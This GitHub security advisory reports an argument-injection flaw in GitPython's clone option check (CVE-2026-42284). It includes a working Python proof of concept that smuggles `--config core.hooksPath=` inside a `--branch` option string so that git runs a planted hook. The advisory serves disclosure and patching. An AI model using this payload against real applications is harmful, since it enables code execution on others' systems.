# [H] GitPython: Unsafe option check validates multi_options before shlex.split transformation

## Summary
Severity: High
Advisory: GHSA-x2qx-6953-8485
CVE: CVE-2026-42284
CWE: CWE-88
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-25
Source: https://github.com/advisories/GHSA-x2qx-6953-8485
Type: github-advisory

## Affected
- PyPI: `GitPython` — affected >=0 <3.1.47

## Details
### Summary

`_clone()` validates `multi_options` as the original list, then executes `shlex.split(" ".join(multi_options))`. A string like `"--branch main --config core.hooksPath=/x"` passes validation (starts with `--branch`), but after split becomes `["--branch", "main", "--config", "core.hooksPath=/x"]`. Git applies the config and executes attacker hooks during clone.

### Details

The vulnerable code is in [`git/repo/base.py` line 1383](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1383):
```python
multi = shlex.split(" ".join(multi_options))
```

Then validation runs on the **original** list at [line 1390](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1390):
```python
Git.check_unsafe_options(options=multi_options, unsafe_options=cls.unsafe_git_clone_options)
```

Then execution uses the **transformed** result at [line 1392](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1392):
```python
proc = git.clone(multi, "--", url, path, ...)
```

The [check at `git/cmd.py` line 959](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/cmd.py#L959) uses `startswith`:
```python
if option.startswith(unsafe_option) or option == bare_option:
```

`"--branch main --config ..."` does not start with `"--config"`, so it passes. After `shlex.split`, `"--config"` becomes its own token and reaches git.

Also affects `Submodule.update()` via `clone_multi_options`.

### PoC

```python
import sys, pathlib, subprocess
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))

from git import Repo
from git.exc import UnsafeOptionError

try:
    Repo.clone_from("/nonexistent", "/tmp/x", multi_options=["--config", "core.hooksPath=/x"])
except UnsafeOptionError:
    print("multi_options=['--config', '...']: Block as expected")
except Exception:
    pass

DIR = pathlib.Path(__file__).resolve().parent / "workdir_b"
SRC = DIR / "repo"
DST = DIR / "dst"
HOOKS = DIR / "hooks"
LOG = DIR / "output.log"

if not SRC.exists():
    SRC.mkdir(parents=True)
    r = lambda *a: subprocess.run(a, cwd=SRC, capture_output=True)
    r("git", "init", "-b", "main")
    (SRC / "f").write_text("x\n")
    r("git", "add", ".")
    r("git", "commit", "-m", "init")

HOOKS.mkdir(exist_ok=True)
hook = HOOKS / "post-checkout"
hook.write_text(f"#!/bin/sh\nwhoami > {LOG.as_posix()}\nhostname >> {LOG.as_posix()}\n")
hook.chmod(0o755)

LOG.unlink(missing_ok=True)
payload = "--branch main --config core.hooksPath=" + HOOKS.as_posix()

try:
    Repo.clone_from(str(SRC), str(DST), multi_options=[payload])
except UnsafeOptionError:
    print(f"multi_options=['{payload}']: BLOCKED"); sys.exit(1)
except Exception:
    pass

if not LOG.exists() and DST.exists():
    subprocess.run(["git", "checkout", "--force", "main"], cwd=DST, capture_output=True)

print(f"multi_options=['{payload}']: not blocked")
print(f"\nHook executed: {LOG.exists()}")
if LOG.exists():
    print(LOG.read_text().strip())
```

**Output:**
```
multi_options=['--config', '...']: Block as expected
multi_options=['--branch main --config core.hooksPath=.../hooks']: not blocked

Hook executed: True
texugo
DESKTOP-5w5HH79
```

### Impact

Any application passing user input to `multi_options` in `clone_from()`, `clone()`, or `Submodule.update()` is vulnerable. Attacker embeds `--config core.hooksPath=<dir>` inside a string starting with a safe option. Check does not block it. Git executes attacker code. Same class as CVE-2023-40267.

## References
- https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-x2qx-6953-8485
- https://nvd.nist.gov/vuln/detail/CVE-2026-42284
- https://github.com/gitpython-developers/GitPython
- https://github.com/gitpython-developers/GitPython/releases/tag/3.1.47
- https://www.tenable.com/cve/CVE-2026-32686
